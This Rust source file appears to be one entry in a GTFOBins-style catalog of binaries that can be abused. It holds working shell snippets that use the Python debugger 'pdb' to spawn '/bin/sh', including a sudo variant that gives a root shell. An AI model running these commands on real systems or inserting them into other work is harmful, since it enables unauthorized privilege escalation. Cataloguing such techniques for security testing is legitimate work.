pub static BIN_NAME: &'static str = "pdb";
pub static BIN_DESC: &'static str =
    "This allows to execute `python` code, other functions may apply.";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'import os; os.system("/bin/sh")' > $TF
    pdb $TF
    cont
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'import os; os.system("/bin/sh")' > $TF
    sudo pdb $TF
    cont
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
